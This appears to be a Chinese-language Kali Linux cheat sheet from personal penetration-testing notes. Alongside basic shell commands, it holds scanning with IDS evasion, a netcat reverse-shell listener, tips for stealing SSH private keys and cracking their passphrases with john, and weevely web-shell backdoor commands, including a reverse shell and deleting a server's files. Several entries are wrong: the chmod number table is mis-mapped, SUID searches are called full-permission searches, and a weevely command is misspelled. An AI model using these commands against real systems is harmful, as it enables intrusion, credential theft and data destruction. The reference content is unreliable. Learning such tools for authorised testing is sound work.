# Kali Linux指令

- **打印**
    - 打印字符串
        
        ```bash
        echo Hello
        ```
        
        - 相关技巧
            - 打印以Base64编码
                
                ```bash
                echo Hello | base64
                ```
                
    - 将左侧标准输出作为右侧标准输入
        
        ```bash
        a|b
        ```
        
    - 将左侧标准输出写入到文件
        
        ```bash
        a>[file_name]
        ```
        
        - 相关技巧
            - 重定向标准输出的序号
                
                ```bash
                0>[file_name]
                ```
                
            - 忽略语句的（报错）输出
                
                ```bash
                2>/dev/null
                ```
                
    - 将左侧标准输出追加到文件
        
        ```bash
        b>>[file_name]
        ```
        
- **文件管理**
    - 打印当前的工作目录
        
        ```bash
        pwd
        ```
        
    - 列出特定路径中的目录
        
        ```bash
        ls [path_name]
        ```
        
        - 相关技巧
            - 列出目录中所有文件（权限与隐藏文件）
                
                ```bash
                ls -al [path_name]
                ```
                
            - 列出子目录的文件
                
                ```bash
                ls -R [path_name]
                ```
                
    - 进入指定目录
        
        ```bash
        cd [path_name]
        ```
        
        - 相关技巧
            - 进入根目录
                
                ```bash
                cd /root
                ```
                
            - 进入缓存目录（检查残留文件）
                
                ```bash
                cd /tmp
                ```
                
    - 移动文件、重命名文件
        
        ```bash
        mv [file_name] [path_name]
        ```
        
        ```bash
        mv [org_name] [new_name]
        ```
        
    - 查找文件（带有条件）
        - 指定目录开始，递归查询具有完全权限的文件
            
            ```bash
            find [path_name] -perm -4000
            ```
            
        - 整机查询具有完全权限的文件
            
            ```bash
            find / -perm -4000 2>/dev/null
            ```
            
        - 查看隶属于某用户的文件
            
            ```bash
            find / -user [user_name]
            ```
            
    - 修改文件权限
        - 将文件设为任何人完全权限
            
            ```bash
            chmod 777 [file_name]
            ```
            
        - 只有拥有者完全权限
            
            ```bash
            chmod u=7,g=0,o=0 [file_name]
            ```
            
        - 同组成员添加可执行权限
            
            ```bash
            chmod g+x
            ```
            
        - 相关细节
            1. 用户权限
                
                
                | 字符表示 | 用户权限 |
                | --- | --- |
                | u | 文件所有者 |
                | g | 与文件所有者同级 |
                | o | 除文件所有者外 |
                | a | 任何人 |
            2. 权限修改
                
                
                | 字符表示 | 修改效果 |
                | --- | --- |
                | + | 增加权限 |
                | - | 撤销权限 |
                | = | 设定权限 |
            3. 数字缩写
                
                
                | rwx | rw- | r-- | r-x | -wx | -w- | --x | --- |
                | --- | --- | --- | --- | --- | --- | --- | --- |
                | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |
    - 删除文件
        
        ```bash
        rm [file_name]
        ```
        
        - 相关技巧
            - 确认提示删除文件
                
                ```bash
                rm -i [file_name]
                ```
                
            - 递归强制删除文件
                
                ```bash
                rm -rf [file_name]
                ```
                
    - 创建目录
        
        ```bash
        mkdir [dir_name]
        ```
        
    - 创建文件
        
        ```bash
        touch [file_name]
        ```
        
    - 打印文件内容
        
        ```bash
        cat [file_name]
        ```
        
        - 相关技巧
            - 查看所有用户列表
                
                ```bash
                cat /etc/passwd
                ```
                
            - 查看用户组
                
                ```bash
                cat /etc/group
                ```
                
    - 查看压缩包内文件
        
        ```bash
        zcat [zip_name]
        ```
        
    - 打印文件中的（可打印）字符串
        
        ```bash
        strings [file_name]
        ```
        
- **文件编辑**
    - 命令行文本编辑器
        
        ```bash
        vim [file_name]
        ```
        
        - 插入模式：`a` 或者 `i`
        - 返回普通模式：`[Esc]`
        - 新建空行，并定位光标：`:o`
        - 保存且退出：`:wq`
        - 不保存强制退出：`:q!`
        - 退出：`:quit`
        - 退出：`[Shift]` + `zz`
- **系统相关**
    1. 授予用户管理员权限
        
        ```bash
        su
        ```
        
    2. 以管理员权限执行命令
        
        ```bash
        sudo [command]
        ```
        
        - 相关技巧
            1. 查询具有管理员权限的命令
                
                ```bash
                sudo -l
                ```
                
    3. 查看当前所在用户组
        
        ```bash
        whoami
        ```
        
    4. 查看当前用户信息
        
        ```bash
        id
        ```
        
    5. 查看指令所在位置
        
        ```bash
        whereis [command]
        ```
        
- **杂项**
    1. 查看命令提示
        
        ```bash
        man [command]
        ```
        
- **网络**
    - 下载文件到当前目录
        
        ```bash
        wget [http://ip:port]
        ```
        
    - 尝试访问网页，获取请求头与响应
        
        ```bash
        curl -v [http://ip:port]
        ```
        
    - 打印本机网络地址
        
        ```bash
        ifconfig #其中：inet为本地网卡
        ```
        
    - 检查网络地址可访问性
        
        ```bash
        ping [http://ip:port]
        ```
        
    - 扫描局域网内所有用户地址
        
        ```bash
        arp-scan -l
        ```
        
        ```
        netdiscover -r [current_ip]/24
        ```
        
    - 扫描端口
        - 通过版本扫描探测端口
            
            ```bash
            nmap -sV [target_ip]
            ```
            
        - 跳过主机发现，进行端口扫描
            
            ```bash
            nmap -Pn [target_ip]
            ```
            
        - 全面扫描端口
            
            ```bash
            nmap -A -v [target_ip]
            ```
            
        - 探测操作系统类型，内核版本
            
            ```bash
            nmap -O [target_ip]
            ```
            
        - ping扫描
            
            ```bash
            nmap -sP [target_ip]
            ```
            
        - 无ping扫描
            
            <aside>
            💡 避免防火墙发现ping行为
            
            </aside>
            
            ```bash
            nmap -p0 [target_ip]
            ```
            
    - 探测服务隐藏文件，敏感文件
        
        ```bash
        dirb [http://ip:port]
        ```
        
    - 探测服务重点文件
        
        ```bash
        nikto -host [ip]
        ```
        
        - 相关技巧
            - 按端口扫描
                
                ```bash
                nikto -host [ip] -p
                ```
                
            - 绕过IDS入侵检测
                
                <aside>
                💡 后接可选模式序号
                
                </aside>
                
                ```bash
                nikto -host [ip] -evasion 12345678
                ```
                
            - 配合nmap扫描
                
                ```bash
                nmap -p[port] [ip] -oG - | nikto -host-
                ```
                
    - netcat端口监听
        
        <aside>
        💡 配合反弹Shell
        
        </aside>
        
        ```bash
        nc -lvnp [free_port]
        ```
        
    - netcat建立简单响应
        
        ```bash
        nc -lk [port] -c "echo -e 'HTTP/1.1 200 OK'"
        ```
        
    - 查看已占用端口
        
        ```bash
        netstat -pantu
        ```
        
- **SSH协议登录**
    - 通过SSH在客户端远程登录服务器
        
        ```bash
        ssh [user_name]@[ip]
        ```
        
        1. 使用私钥远程登录服务器
            
            <aside>
            💡 私钥名为id_rsa
            
            </aside>
            
            ```bash
            ssh -i id_rsa [user_name]@[ip]
            ```
            
            - 相关技巧
                - 提升本地私钥文件权限（如需）
                    
                    ```bash
                    chmod 600 id_rsa
                    ```
                    
    - 客户端生成公钥、私钥对
        
        ```bash
        ssh-keygen
        ```
        
    - 拷贝公钥
        
        ```bash
        ssh-copy-id -i [key_address] [user_name]@[ip]
        ```
        
        - 相关技巧
            - 服务端公钥地址一般为：`/root/.ssh/id_rsa.pub`
            - 本地私钥地址一般为：`/root/.ssh/id_rsa`
            - 攻击时，尝试获取私钥与登录用户名
            - 认证关键字文件一般同样在`.ssh/`内，保存了数个公钥文件，其内容一般与公钥相同
                - 文件名可能为`authorized_keys`
                - 此文件中，可能找到登录的用户名
            - 公钥上传到服务端之后，本地登录（本地私钥具备读写权限）
                
                ```bash
                ssh [ip]
                ```
                
    - 安全复制文件至本地（SSH协议）
        
        ```bash
        scp -p -P[port] [local_file] [user_name]@[ip]:[remote_file]
        ```
        
        - 相关技巧
            - 复制目录至本地
                
                ```bash
                scp -r -P[port] [local_file] [user_name]@[ip]:[remote_file]
                ```
                
    - 在服务端上传下载文件
        - 链接服务端文件路径
            
            ```bash
            sftp [user_name]@[ip]:[remote_dir]
            ```
            
        - 上传文件到该路径
            
            ```bash
            put [file_name] [remote_dir]
            ```
            
        - 下载文件到本地路径
            
            ```bash
            get [remote_file] [local_dir]
            ```
            
    - 爆破RSA私钥文件的访问密码
        - 将私钥文件转化为john可识别内容
            
            ```bash
            ssh2john id_rsa>[file_name]
            ```
            
        - john爆破转化后私钥文件，获取访问私钥密码
            
            ```bash
            zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules [file_name]
            ```
            
- **漏洞**
    - 中国菜刀，Web Shell漏洞
        - 设定本地登录密码，生成后门文件，存储本地路径
            
            <aside>
            💡 后门文件以`.php`结尾
            
            </aside>
            
            <aside>
            💡 服务器开启Htaccess后，后门文件可以 `.img` `.htaccess`结尾
            
            </aside>
            
            ```bash
            weevely generate [password] [local_path]
            ```
            
        - 远程控制 Web Shell
            
            ```bash
            weevely [http://ip:port/backdoor_name.php] [password]
            ```
            
            - 相关技巧
                1. 此前，通过方法将生成的木马放入服务器，一般放在网站根目录 `/var/www/html/backdoor.php`，其余目录需对应更改URL
            - 常用命令
                
                <aside>
                💡 只在渗透后可用
                
                </aside>
                
                1. 打开虚拟终端：`:shell.sh`
                2. 获取系统基本信息：`:system.info`
                3. 查看php配置信息：`:audit.phpconf`
                4. 建立反弹shell到端口：`:backdoor.reverstcp [host_ip] [port]`
                5. 删除文件：`:file.rm [filename]`
                6. 干掉服务器：`:file.rm [filename] -recursive`
    - 抓包工具
        - Burp Suite：[利用木马远程控制服务器](https://www.cnblogs.com/cainiao-chuanqi/p/14352805.html)
        - WireShark：[WireShark上手教程](https://www.cnblogs.com/mq0036/p/11187138.html)
- **奇技淫巧**
    - 一句话连接两个命令的方法
        
        ```bash
        ping [ip] ; echo Hello
        ```
        
        <aside>
        💡 第一个执行成功之后，执行第二个
        
        </aside>
        
        ```bash
        ping [ip] && echo Hello
        ```
        
        <aside>
        💡 第一个执行失败之后，执行第二个
        
        </aside>
        
        ```bash
        ping [ip] || echo Hello
        ```